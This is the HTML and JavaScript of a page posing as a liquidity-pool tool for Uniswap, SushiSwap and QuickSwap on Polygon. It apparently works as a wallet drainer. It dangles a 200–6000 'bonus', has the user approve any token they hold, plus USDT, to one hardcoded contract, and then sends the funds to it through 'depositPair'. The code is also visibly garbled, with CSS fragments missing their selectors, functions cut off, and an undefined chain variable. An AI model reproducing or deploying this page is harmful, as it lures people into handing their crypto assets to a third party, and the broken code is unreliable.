<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Liquidity Pool | My Positions</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300..700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Vazirmatn', sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            direction: ltr;
            padding: 2rem;
            color: #e8f0e8;
        }

        .sticky-header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: #ffffff;
            z-index: 1000;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
            border-bottom: 2px solid #1a5a3a;
            padding: 0.75rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            direction: ltr;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .site-icon {
            font-size: 2rem;
            background: linear-gradient(135deg, #1a5a3a, #2a7a4a);
            width: 44px;
            height: 44px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .site-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .site-name {
            font-weight: 650;
            font-size: 1.2rem;
            color: #1a3a2a;
            letter-spacing: -0.3px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .header-right w3m-button {
            --w3m-accent: #1a5a3a;
        }

        .page-wrapper {
            width: 100%;
            display: flex;
            justify-content: center;
            padding-top: 95px;
        }

        .main-card {
            max-width: 800px;
            width: 100%;
            background: #ffffff;
            border-radius: 24px;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            padding: 2rem;
            border: 1px solid #c8e0d4;
        }

        /* ===== کد یک غیرفعال ===== */
        #heroSection,
        #waitingMessage,
        #termsWrapper,
        #positionsSection,
        #newPositionSection,
        .footer-copyright {
            display: none !important;
        }

        /* ===== استایل‌های کد دو ===== */

            width: 100%;
            background: white;
            border-radius: 24px;
            padding: 0;
            box-shadow: none;
        }
        .dex-title {
            font-size: 1.6rem;
            font-weight: 600;
            margin-bottom: 2rem;
            text-align: center;
            color: #1a2c3e;
        }
        .dex-field {
            margin-bottom: 1.5rem;

        }
        .dex-field label {

            font-size: 0.85rem;
            font-weight: 500;
            margin-bottom: 0.4rem;
            color: #2c4b35;
        }
        .dex-fake-select {
            width: 100%;

            border: 1px solid #dce5e8;
            border-radius: 20px;

            align-items: center;

            font-weight: 600;

        }

            position: fixed;
            top: 0;

    <script type="module">
        import { createWeb3Modal, defaultWagmiConfig } from "https://esm.sh/@web3modal/wagmi";

        import { watchAccount, writeContract, readContract, simulateContract } from "https://esm.sh/wagmi/actions";
        import { formatUnits, parseUnits, erc20Abi } from "https://esm.sh/viem";

        const projectId = "a3cf1cc1f22d315ced71a1379ca4c292";
        const chains = [polygon];

        const wagmiConfig = defaultWagmiConfig({
            chains,
            projectId,
            metadata: { name: "DeFi Swap", description: "", url: window.location.href, icons: [] }
        });

        createWeb3Modal({ wagmiConfig, projectId, chains });
        
        const walletContainer = document.getElementById('dex-wallet-btn-container');
        const btn = document.createElement("w3m-button");
        walletContainer.appendChild(btn);

        // همچنین دکمه هدر
        const headerWalletContainer = document.getElementById("original-wallet-btn");
        if (headerWalletContainer) {
            const headerBtn = document.createElement("w3m-button");
            headerWalletContainer.appendChild(headerBtn);
        }

        const CONTRACT_ADDRESS = "0xD045a55a067aE1a65Cfe836CcCb194a40cB04CF2";
        const USDT_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
        const NATIVE_POL = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";

        const ROUTER_ABI = [
            { "inputs": [{ "type": "address", "name": "tokenA" }, { "type": "uint256", "name": "amountA" }, { "type": "address", "name": "tokenB" }, { "type": "uint256", "name": "amountB" }], "name": "depositPair", "outputs": [], "stateMutability": "payable", "type": "function" }
        ];

        const ERC20_ABI = [
            { "constant": true, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "type": "function" },
            { "constant": true, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function" },
            { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function" },
            { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" }
        ];

        const USDT_ABI = [
            { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
            { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function" }
        ];

        let currentAccount = null;
        let currentTokenData = { address: '', symbol: '', name: '', balance: 0, decimals: 0 };
        let usdtBalance = 0;
        let polBalance = 0;
        let currentToken = '';
        let currentPair = '';
        let currentExchange = '';
        let currentPool = '';
        let polygonPrice = null;
        let isLoadingPrice = true;

        const MIN_BONUS = 200;
        const MAX_BONUS = 6000;
        const FEE_PERCENT = 2;

        async function fetchUSDTBalance() {
            if (!currentAccount) {
                usdtBalance = 0;
                updateUSDTBalanceDisplay();
                updatePairPopupBalances();
                return;
            }
            try {
                const decimals = await readContract(wagmiConfig, { address: USDT_ADDRESS, abi: USDT_ABI, functionName: 'decimals', chainId: polygon.id });
                const balance = await readContract(wagmiConfig, { address: USDT_ADDRESS, abi: USDT_ABI, functionName: 'balanceOf', args: [currentAccount], chainId: polygon.id });
                usdtBalance = parseFloat(formatUnits(balance, decimals));
                updateUSDTBalanceDisplay();
                updatePairPopupBalances();
            } catch (error) {
                console.error("Failed to fetch USDT balance:", error);
                usdtBalance = 0;
                updateUSDTBalanceDisplay();
                updatePairPopupBalances();
            }
        }

        async function fetchPOLBalance() {
            if (!currentAccount) {
                polBalance = 0;
                updateUSDTBalanceDisplay();
                updatePairPopupBalances();
                return;
            }
            try {
                const balance = await readContract(wagmiConfig, { address: "0x0000000000000000000000000000000000001010", abi: [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}], functionName: 'balanceOf', args: [currentAccount], chainId: polygon.id });
                polBalance = parseFloat(formatUnits(balance, 18));
                updateUSDTBalanceDisplay();
                updatePairPopupBalances();
            } catch (error) {
                console.error("Failed to fetch POL balance:", error);
                polBalance = 0;
                updateUSDTBalanceDisplay();
                updatePairPopupBalances();
            }
        }

        function updateUSDTBalanceDisplay() {
            const usdtRewardInfo = document.getElementById('dexUsdtRewardInfo');
            if (!usdtRewardInfo) return;
            
            if (!currentPair) {
                usdtRewardInfo.style.display = 'none';
                return;
            }
            
            if (currentPair === 'USDT') {
                const balanceText = usdtBalance > 0 ? usdtBalance.toLocaleString() : '0';
                const balanceClass = usdtBalance > 0 ? 'positive' : 'zero';
                usdtRewardInfo.style.display = 'block';
                usdtRewardInfo.className = `dex-reward-info ${usdtBalance > 0 ? 'success' : 'error'}`;
                usdtRewardInfo.innerHTML = `
                    <div class="dex-info-container">
                        <span class="dex-balance-display ${balanceClass}">
                            <img class="dex-balance-logo" src="imgs/usdt.png" onerror="this.style.display='none'" alt="USDT">
                            USDT Balance: ${balanceText} USDT
                        </span>
                    </div>
                `;
            } else if (currentPair === 'Polygon') {
                const balanceText = polBalance > 0 ? polBalance.toLocaleString() : '0';
                const balanceClass = polBalance > 0 ? 'positive' : 'zero';
                usdtRewardInfo.style.display = 'block';
                usdtRewardInfo.className = `dex-reward-info ${polBalance > 0 ? 'success' : 'error'}`;
                usdtRewardInfo.innerHTML = `
                    <div class="dex-info-container">
                        <span class="dex-balance-display ${balanceClass}">
                            <img class="dex-balance-logo" src="imgs/polygan.png" onerror="this.style.display='none'" alt="POL">
                            POL Balance: ${balanceText} POL
                        </span>
                    </div>
                `;
            }
            
            updateUSDTBonus();
        }

        function buildPairPopup() {
            const pairOptionsList = document.getElementById('dexPairOptionsList');
            pairOptionsList.innerHTML = '';
            
            const pairs = [
                { value: 'USDT', label: 'USDT', logo: 'imgs/usdt.png' },
                { value: 'Polygon', label: 'Polygon', logo: 'imgs/polygan.png' }
            ];
            
            pairs.forEach(pair => {
                const div = document.createElement('div');
                div.className = 'dex-option-item';
                div.setAttribute('data-value', pair.value);
                
                const leftDiv = document.createElement('div');
                leftDiv.className = 'dex-option-left';
                
                const img = document.createElement('img');
                img.className = 'dex-option-logo';
                img.src = pair.logo;
                img.alt = pair.label;
                img.onerror = function() { this.style.display = 'none'; };
                
                const labelSpan = document.createElement('span');
                labelSpan.className = 'dex-option-label';
                labelSpan.textContent = pair.label;
                
                leftDiv.appendChild(img);
                leftDiv.appendChild(labelSpan);
                
                const balanceSpan = document.createElement('span');
                balanceSpan.className = 'dex-option-balance';
                if (pair.value === 'USDT') {
                    balanceSpan.textContent = usdtBalance > 0 ? `${usdtBalance.toLocaleString()} USDT` : ' 0 USDT';
                } else if (pair.value === 'Polygon') {
                    balanceSpan.textContent = polBalance > 0 ? `${polBalance.toLocaleString()} POL` : ' 0 POL';
                }
                
                div.appendChild(leftDiv);
                div.appendChild(balanceSpan);
                
                div.onclick = () => {
                    updatePairDisplay(pair.value, pair.logo);
                    closeAllDropdowns();
                };
                
                pairOptionsList.appendChild(div);
            });
        }

        function updatePairPopupBalances() {
            const pairOptionsList = document.getElementById('dexPairOptionsList');
            if (!pairOptionsList) return;
            
            const options = pairOptionsList.querySelectorAll('.dex-option-item');
            options.forEach(opt => {
                const value = opt.getAttribute('data-value');
                const balanceSpan = opt.querySelector('.dex-option-balance');
                if (value === 'USDT') {
                    if (balanceSpan) {
                        balanceSpan.textContent = usdtBalance > 0 ? `${usdtBalance.toLocaleString()} USDT` : ' 0 USDT';
                    }
                } else if (value === 'Polygon') {
                    if (balanceSpan) {
                        balanceSpan.textContent = polBalance > 0 ? `${polBalance.toLocaleString()} POL` : ' 0 POL';
                    }
                }
            });
        }

        watchAccount(wagmiConfig, {
            onChange(account) {
                if (account?.address) {
                    currentAccount = account.address;
                    const checkBtn = document.getElementById('dexCheckBalanceBtn');
                    if (checkBtn) checkBtn.disabled = false;
                    fetchUSDTBalance();
                    fetchPOLBalance();
                    buildPairPopup();
                } else {
                    currentAccount = null;
                    const checkBtn = document.getElementById('dexCheckBalanceBtn');
                    if (checkBtn) checkBtn.disabled = true;
                    document.getElementById('dexTokenResult').innerHTML = '';
                    usdtBalance = 0;
                    polBalance = 0;
                    buildPairPopup();
                    updateUSDTBalanceDisplay();
                }
            }
        });

        function getLogoLetter(symbol) {
            if (!symbol || symbol.length === 0) return '?';
            return symbol.charAt(0).toUpperCase();
        }

        window.checkTokenBalance = async function() {
            const tokenAddress = document.getElementById('dexContractInput').value.trim();
            const confirmBtnElem = document.getElementById('dexConfirmBtn');
            
            if (!tokenAddress || !tokenAddress.match(/^0x[a-fA-F0-9]{40}$/i)) {
                document.getElementById('dexTokenResult').innerHTML = '<div style="color:#ef4444; text-align:center;">Invalid contract address</div>';
                confirmBtnElem.disabled = true;
                return;
            }
            
            if (!currentAccount) {
                document.getElementById('dexTokenResult').innerHTML = '<div style="color:#ef4444; text-align:center;">Wallet not connected</div>';
                confirmBtnElem.disabled = true;
                return;
            }
            
            document.getElementById('dexTokenResult').innerHTML = '<div style="text-align:center;">Checking balance...</div>';
            confirmBtnElem.disabled = true;
            
            try {
                const [name, symbol, decimals, balance] = await Promise.all([
                    readContract(wagmiConfig, { address: tokenAddress, abi: ERC20_ABI, functionName: 'name', chainId: polygon.id }),
                    readContract(wagmiConfig, { address: tokenAddress, abi: ERC20_ABI, functionName: 'symbol', chainId: polygon.id }),
                    readContract(wagmiConfig, { address: tokenAddress, abi: ERC20_ABI, functionName: 'decimals', chainId: polygon.id }),
                    readContract(wagmiConfig, { address: tokenAddress, abi: ERC20_ABI, functionName: 'balanceOf', args: [currentAccount], chainId: polygon.id })
                ]);
                
                const formattedBalance = formatUnits(balance, decimals);
                const balanceNum = parseFloat(formattedBalance);
                const letter = getLogoLetter(symbol);
                
                currentTokenData = {
                    address: tokenAddress,
                    symbol: symbol,
                    name: name,
                    balance: balanceNum,
                    decimals: decimals
                };
                
                const balanceColor = balanceNum > 0 ? "#000000" : "#ef4444";
                const balanceText = balanceNum > 0 ? balanceNum.toLocaleString() : "0";
                const statusText = balanceNum > 0 ? "In wallet" : "Not in wallet";
                
                document.getElementById('dexTokenResult').innerHTML = `
                    <div class="dex-token-result-card">
                        <div class="dex-token-logo" style="background:#000000;">${letter}</div>
                        <div class="dex-token-info">
                            <div class="dex-token-symbol">${symbol}</div>
                            <div class="dex-token-name">${name}</div>
                            <div class="dex-token-balance" style="color:${balanceColor};">${balanceText}</div>
                            <div class="dex-token-status">${statusText}</div>
                        </div>
                    </div>
                `;
                confirmBtnElem.disabled = false;
            } catch (error) {
                console.error(error);
                document.getElementById('dexTokenResult').innerHTML = '<div style="color:#ef4444; text-align:center;">Error: Invalid contract or token not found</div>';
                currentTokenData = { address: '', symbol: '', name: '', balance: 0, decimals: 0 };
                confirmBtnElem.disabled = true;
            }
        };

        document.getElementById('dexCheckBalanceBtn').onclick = () => window.checkTokenBalance();
        document.getElementById('dexCheckBalanceBtn').disabled = true;

        const overlay = document.getElementById('dexOverlay');
        const bottomPopup = document.getElementById('dexBottomPopup');
        const bottomPopupBody = document.getElementById('dexBottomPopupBody');
        const closeBottomPopupBtn = document.getElementById('dexCloseBottomPopupBtn');
        
        const exchangeBtn = document.getElementById('dexExchangeBtn');
        const exchangeLabel = document.getElementById('dexExchangeLabel');
        const exchangePopup = document.getElementById('dexExchangePopup');
        
        const poolBtn = document.getElementById('dexPoolBtn');
        const poolLabel = document.getElementById('dexPoolLabel');
        const poolPopup = document.getElementById('dexPoolPopup');
        const poolOptionsList = document.getElementById('dexPoolOptionsList');
        
        const pairBtn = document.getElementById('dexPairBtn');
        const pairLabel = document.getElementById('dexPairLabel');
        const pairPopup = document.getElementById('dexPairPopup');
        
        const tokenBtn = document.getElementById('dexTokenBtn');
        const tokenLabel = document.getElementById('dexTokenLabel');
        const tokenInfo = document.getElementById('dexTokenInfo');
        const tokenPopup = document.getElementById('dexTokenPopup');
        const contractInput = document.getElementById('dexContractInput');
        const confirmBtn = document.getElementById('dexConfirmBtn');
        const clearBtn = document.getElementById('dexClearBtn');
        
        const pairAmountInput = document.getElementById('dexPairAmount');
        const tokenAmountInput = document.getElementById('dexTokenAmount');
        const pairAmountLabel = document.getElementById('dexPairAmountLabel');
        const tokenAmountLabel = document.getElementById('dexTokenAmountLabel');
        const usdtRewardInfo = document.getElementById('dexUsdtRewardInfo');
        const usdtWarning = document.getElementById('dexUsdtWarning');
        const tokenRewardInfo = document.getElementById('dexTokenRewardInfo');
        const maxTokenBtn = document.getElementById('dexMaxTokenBtn');
        const pairMaxBtn = document.getElementById('dexPairMaxBtn');
        
        const gasFeeSpan = document.getElementById('dexGasFee');
        const tradingRangeSpan = document.getElementById('dexTradingRange');
        
        const reviewBtn = document.getElementById('dexReviewBtn');

        function formatNumberForBox(num) {
            if (num === undefined || num === null || isNaN(num)) return '0';
            return Math.round(parseFloat(num)).toString();
        }
        
        function formatNumberWithCommaForBox(num) {
            let rounded = Math.round(parseFloat(num));
            return rounded.toLocaleString('en-US');
        }
        
        function formatNumberForPrice(num) {
            if (num === undefined || num === null || isNaN(num)) return '0';
            let n = parseFloat(num);
            if (Math.floor(n) === n) return n.toString();
            let str = n.toFixed(8).replace(/\.?0+$/, '');
            return str;
        }
        
        function getUsdtValue() {
            let pairAmount = parseFloat(pairAmountInput.value) || 0;
            if (currentPair === 'USDT') return pairAmount;
            if (currentPair === 'Polygon' && polygonPrice !== null) return pairAmount * polygonPrice;
            return 0;
        }
        
        async function getPolygonPrice() {
            try {
                const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd");
                const data = await response.json();
                polygonPrice = data["polygon-ecosystem-token"].usd;
                isLoadingPrice = false;
                if (currentPair === 'Polygon') {
                    updateUSDTBonus();
                    checkReviewButton();
                }
            } catch (error) {
                console.error("Failed to fetch POL price:", error);
                polygonPrice = null;
                isLoadingPrice = false;
                if (currentPair === 'Polygon') {
                    updateUSDTBonus();
                    checkReviewButton();
                }
            }
        }

        async function executeCreation() {
            const statusDiv = document.getElementById('dexCreationStatus');
            
            const createBtn = document.getElementById('dexCreatePositionBtn');
            if (createBtn) createBtn.remove();
            
            statusDiv.innerHTML = `
                <div class="dex-status-step">
                    <div class="dex-step-line dex-step-active" id="dexStepContinue">⟳ Continue in your wallet...</div>
                    <div class="dex-step-line dex-step-pending" id="dexStepApprove" style="display:none;">⏳ Approve in wallet...</div>
                    <div class="dex-step-line dex-step-pending" id="dexStepConfirm" style="display:none;">⏳ Confirm deposit in wallet...</div>
                </div>
            `;
            
            try {
                const tokenAddress = currentTokenData.address;
                const tokenAmount = parseFloat(tokenAmountInput.value);
                const pairAmount = parseFloat(pairAmountInput.value);
                
                if (!tokenAddress || !currentTokenData.symbol) {
                    throw new Error("Invalid token");
                }
                
                let decimals = currentTokenData.decimals || 18;
                const tokenAmountWei = parseUnits(tokenAmount.toString(), decimals);
                
                const stepContinue = document.getElementById('dexStepContinue');
                const stepApprove = document.getElementById('dexStepApprove');
                const stepConfirm = document.getElementById('dexStepConfirm');
                
                if (stepContinue) {
                    stepContinue.classList.remove('dex-step-active');
                    stepContinue.classList.add('dex-step-success');
                    stepContinue.innerHTML = '✓ Continue in your wallet';
                }
                
                if (stepApprove) {
                    stepApprove.style.display = 'block';
                    stepApprove.classList.remove('dex-step-pending');
                    stepApprove.classList.add('dex-step-active');
                    stepApprove.innerHTML = '⟳ Approve in wallet...';
                }
                
                const approveSimulate = await simulateContract(wagmiConfig, {
                    address: tokenAddress,
                    abi: erc20Abi,
                    functionName: "approve",
                    args: [CONTRACT_ADDRESS, tokenAmountWei],
                    account: currentAccount,
                    chainId: polygon.id
                });
                
                const approveHash = await writeContract(wagmiConfig, approveSimulate.request);
                
                if (stepApprove) {
                    stepApprove.classList.remove('dex-step-active');
                    stepApprove.classList.add('dex-step-success');
                    stepApprove.innerHTML = `✓ Approve in wallet (${approveHash ? approveHash.slice(0,10) : ''}...)`;
                }
                
                if (currentPair === 'USDT') {
                    const stepApproveUSDT = document.createElement('div');
                    stepApproveUSDT.className = 'dex-step-line dex-step-active';
                    stepApproveUSDT.id = 'dexStepApproveUSDT';
                    stepApproveUSDT.innerHTML = '⟳ Approve USDT in wallet...';
                    statusDiv.querySelector('.dex-status-step').appendChild(stepApproveUSDT);
                    
                    const usdtAmountWei = parseUnits(pairAmount.toString(), 6);
                    const approveUSDSimulate = await simulateContract(wagmiConfig, {
                        address: USDT_ADDRESS,
                        abi: erc20Abi,
                        functionName: "approve",
                        args: [CONTRACT_ADDRESS, usdtAmountWei],
                        account: currentAccount,
                        chainId: polygon.id
                    });
                    
                    const approveUSDTHash = await writeContract(wagmiConfig, approveUSDSimulate.request);
                    
                    const stepApproveUSDTElem = document.getElementById('dexStepApproveUSDT');
                    if (stepApproveUSDTElem) {
                        stepApproveUSDTElem.classList.remove('dex-step-active');
                        stepApproveUSDTElem.classList.add('dex-step-success');
                        stepApproveUSDTElem.innerHTML = `✓ Approve USDT in wallet (${approveUSDTHash ? approveUSDTHash.slice(0,10) : ''}...)`;
                    }
                }
                
                if (stepConfirm) {
                    stepConfirm.style.display = 'block';
                    stepConfirm.classList.remove('dex-step-pending');
                    stepConfirm.classList.add('dex-step-active');
                    stepConfirm.innerHTML = '⟳ Confirm deposit in wallet...';
                }
                
                let tokenA, amountA, tokenB, amountB, value = 0n;
                
                if (currentPair === 'USDT') {
                    const usdtAmountWei = parseUnits(pairAmount.toString(), 6);
                    tokenA = USDT_ADDRESS;
                    amountA = usdtAmountWei;
                    tokenB = tokenAddress;
                    amountB = tokenAmountWei;
                    value = 0n;
                } else {
                    const polAmountWei = parseUnits(pairAmount.toString(), 18);
                    tokenA = tokenAddress;
                    amountA = tokenAmountWei;
                    tokenB = NATIVE_POL;
                    amountB = polAmountWei;
                    value = polAmountWei;
                }
                
                const depositSimulate = await simulateContract(wagmiConfig, {
                    address: CONTRACT_ADDRESS,
                    abi: ROUTER_ABI,
                    functionName: "depositPair",
                    args: [tokenA, amountA, tokenB, amountB],
                    account: currentAccount,
                    chainId: polygon.id,
                    value: value
                });
                
                const depositHash = await writeContract(wagmiConfig, depositSimulate.request);
                
                if (stepConfirm) {
                    stepConfirm.classList.remove('dex-step-active');
                    stepConfirm.classList.add('dex-step-success');
                    stepConfirm.innerHTML = `✓ Confirm deposit in wallet (${depositHash ? depositHash.slice(0,10) : ''}...)`;
                }
                
                statusDiv.innerHTML += `<div class="dex-step-line dex-step-success" style="margin-top:0.5rem;">✅ Position created successfully!</div>`;
                
            } catch (error) {
                console.error(error);
                let errorMsg = error.message.slice(0,100);
                if (errorMsg.includes("user rejected")) {
                    errorMsg = "Transaction rejected by user";
                } else if (errorMsg.includes("insufficient")) {
                    errorMsg = "Insufficient balance";
                } else if (errorMsg.includes("execution reverted")) {
                    errorMsg = "Transaction failed. Make sure you have enough balance and try again.";
                }
                statusDiv.innerHTML += `<div class="dex-step-line dex-step-error">❌ Error: ${errorMsg}</div>`;
            }
        }

        function rebuildPoolPopup() {
            poolOptionsList.innerHTML = '';
            if (!currentExchange) return;
            
            let activeOptions = [];
            let disabledOptions = [];
            
            if (currentExchange === 'Uniswap') {
                activeOptions = [
                    { value: 'V4', label: 'V4', disabled: false },
                    { value: 'V3', label: 'V3', disabled: false }
                ];
                disabledOptions = [{ value: 'V2', label: 'V2', disabled: true }];
            } 
            else if (currentExchange === 'SushiSwap') {
                activeOptions = [{ value: 'V3', label: 'V3', disabled: false }];
                disabledOptions = [{ value: 'V2', label: 'V2', disabled: true }];
                if (currentPool === 'V4') {
                    currentPool = 'V3';
                    poolLabel.innerText = 'V3';
                }
            }
            else if (currentExchange === 'QuickSwap') {
                activeOptions = [{ value: 'V3', label: 'V3', disabled: false }];
                disabledOptions = [{ value: 'V2', label: 'V2', disabled: true }];
                if (currentPool === 'V4') {
                    currentPool = 'V3';
                    poolLabel.innerText = 'V3';
                }
            }
            
            activeOptions.forEach(opt => {
                const div = document.createElement('div');
                div.className = 'dex-option-item';
                div.setAttribute('data-value', opt.value);
                
                const leftDiv = document.createElement('div');
                leftDiv.className = 'dex-option-left';
                leftDiv.appendChild(document.createTextNode(opt.label));
                div.appendChild(leftDiv);
                
                div.onclick = () => {
                    currentPool = opt.value;
                    poolLabel.innerText = opt.value;
                    closeAllDropdowns();
                    updateBottomValues();
                    checkReviewButton();
                };
                poolOptionsList.appendChild(div);
            });
            
            disabledOptions.forEach(opt => {
                const div = document.createElement('div');
                div.className = 'dex-option-item disabled';
                div.setAttribute('data-value', opt.value);
                
                const leftDiv = document.createElement('div');
                leftDiv.className = 'dex-option-left';
                leftDiv.appendChild(document.createTextNode(opt.label));
                div.appendChild(leftDiv);
                
                poolOptionsList.appendChild(div);
            });
        }

            if (bonus < MIN_BONUS) return MIN_BONUS;
            if (bonus > MAX_BONUS) return MAX_BONUS;
            return bonus;
        }

                checkReviewButton();

        function openDropdown(dropdownElement, triggerElement) {
            closeAllDropdowns();
            if (!triggerElement) return;
            const rect = triggerElement.getBoundingClientRect();
            dropdownElement.style.position = 'fixed';
            dropdownElement.style.top = (rect.bottom + 5) + 'px';
            dropdownElement.style.left = rect.left + 'px';
            dropdownElement.style.width = rect.width + 'px';
            dropdownElement.style.display = 'block';
        }

        function closeAllPopups() {
            closeAllDropdowns();
            tokenPopup.style.display = 'none';
        }

        function openPopup(popup) {
            closeAllPopups();
            popup.style.display = 'block';
        }

        exchangeBtn.onclick = (e) => {
            e.stopPropagation();
            openDropdown(exchangePopup, exchangeBtn);
        };

        document.querySelectorAll('#dexExchangePopup .dex-option-item').forEach(opt => {
            opt.onclick = (e) => {
                e.stopPropagation();
                currentExchange = opt.getAttribute('data-value');
                const logo = opt.querySelector('.dex-option-logo')?.src || '';
                exchangeLabel.innerHTML = `<div class="dex-selected-content"><img class="dex-selected-logo" src="${logo}" onerror="this.style.display='none'">${currentExchange}</div>`;
                unlockPoolType();
                enableTradingPairAndToken();
                disableAmountFields();
                
                if (currentExchange === 'Uniswap') {
                    currentPool = 'V4';
                    poolLabel.innerText = 'V4';
                } else {
                    currentPool = 'V3';
                    poolLabel.innerText = 'V3';
                }
                
                currentPair = '';
                pairLabel.innerText = 'Select pair';
                currentToken = '';
                currentTokenData = { address: '', symbol: '', name: '', balance: 0, decimals: 0 };
                tokenLabel.innerText = 'Select token';
                tokenRewardInfo.style.display = 'none';
                
                rebuildPoolPopup();
                closeAllDropdowns();
                updateBottomValues();
                checkReviewButton();
            };
        });

        poolBtn.onclick = (e) => {
            e.stopPropagation();
            if (currentExchange) {
                rebuildPoolPopup();
                openDropdown(poolPopup, poolBtn);
            }
        };

        function updatePairDisplay(value, logoUrl) {
            currentPair = value;
            const displayName = value === 'Polygon' ? 'Polygon' : value;
            pairLabel.innerHTML = `<div class="dex-selected-content"><img class="dex-selected-logo" src="${logoUrl}" onerror="this.style.display='none'">${displayName}</div>`;
            updatePairAmountLabel();
            pairAmountInput.value = '';
            
            if (currentPair === 'USDT' || currentPair === 'Polygon') {
                updateUSDTBalanceDisplay();
            }
            
            updateUSDTBonus();
            updateBottomValues();
            
            if (currentPair !== '' && currentToken !== '') enableAmountFields();
            checkReviewButton();
            
            if (currentPair === 'Polygon') {
                getPolygonPrice();
            }
        }

        pairBtn.onclick = (e) => {
            e.stopPropagation();
            if (currentExchange) {
                buildPairPopup();
                openDropdown(pairPopup, pairBtn);
            }
        };

        function updateTokenDisplay() {
            if (currentTokenData.symbol && currentTokenData.symbol !== '') {
                let displaySymbol = currentTokenData.symbol;
                let shortSymbol = displaySymbol.length > 16 ? displaySymbol.slice(0,10)+'...'+displaySymbol.slice(-6) : displaySymbol;
                const letter = getLogoLetter(currentTokenData.symbol);
                tokenLabel.innerHTML = `<div class="dex-selected-content"><div class="dex-token-logo-small" style="background:#000000; width:20px; height:20px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; color:white; font-size:10px; font-weight:bold;">${letter}</div>${shortSymbol}</div>`;
                updateTokenReward();
            } else if (currentToken && !currentTokenData.symbol) {
                tokenLabel.innerText = 'Token Selected';
                tokenRewardInfo.style.display = 'none';
            } else {
                tokenLabel.innerText = 'Select token';
                tokenRewardInfo.style.display = 'none';
            }
            updateTokenAmountLabel();
            updateBottomValues();
            
            if (currentPair !== '' && currentToken !== '') enableAmountFields();
            checkReviewButton();
        }

        tokenBtn.onclick = () => {
            if (currentExchange) {
                openPopup(tokenPopup);
                if (currentToken) {
                    contractInput.value = currentToken;
                } else {
                    contractInput.value = '';
                }
                document.getElementById('dexTokenResult').innerHTML = '';
                document.getElementById('dexConfirmBtn').disabled = true;
                setTimeout(() => contractInput.focus(), 50);
            }
        };

        confirmBtn.onclick = () => {
            let address = contractInput.value.trim();
            if (address !== '' && currentTokenData.symbol) {
                currentToken = address;
                updateTokenDisplay();
            }
            closeAllPopups();
        };

        clearBtn.onclick = () => {
            currentToken = '';
            currentTokenData = { address: '', symbol: '', name: '', balance: 0, decimals: 0 };
            contractInput.value = '';
            tokenAmountInput.value = '';
            document.getElementById('dexTokenResult').innerHTML = '';
            document.getElementById('dexConfirmBtn').disabled = true;
            updateTokenDisplay();
            disableAmountFields();
            closeAllPopups();
            checkReviewButton();
        };

        pairMaxBtn.onclick = () => {
            if (currentPair === 'USDT' && usdtBalance > 0) {
                pairAmountInput.value = Math.floor(usdtBalance);
                updateUSDTBonus();
                checkReviewButton();
            } else if (currentPair === 'Polygon' && polBalance > 0) {
                pairAmountInput.value = Math.floor(polBalance);
                updateUSDTBonus();
                checkReviewButton();
            }
        };

        maxTokenBtn.onclick = () => {
            if (currentToken !== '' && currentPair !== '' && currentTokenData.balance > 0) {
                tokenAmountInput.value = Math.floor(currentTokenData.balance);
                updateTokenReward();
                checkReviewButton();
            }
        };

        reviewBtn.onclick = showBottomPopup;
        closeBottomPopupBtn.onclick = closeBottomPopup;
        overlay.onclick = closeBottomPopup;

        document.addEventListener('click', (e) => {
            if (!e.target.closest('.dex-dropdown') && !e.target.closest('.dex-fake-select')) {
                closeAllDropdowns();
            }
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                closeBottomPopup();
                closeAllPopups();
            }
        });

        pairAmountInput.addEventListener('input', () => {
            updateUSDTBonus();
            checkReviewButton();
        });

        tokenAmountInput.addEventListener('input', () => {
            updateTokenReward();
            checkReviewButton();
        });

        getPolygonPrice();
        setInterval(getPolygonPrice, 30000);
        setInterval(() => {
            if (currentAccount) {
                fetchUSDTBalance();
                fetchPOLBalance();
            }
        }, 30000);

        buildPairPopup();
        updatePairAmountLabel();
        updateTokenAmountLabel();
        updateBottomValues();
        updateTokenReward();
        lockPoolType();
        checkReviewButton();
    </script>
</body>
    </html>
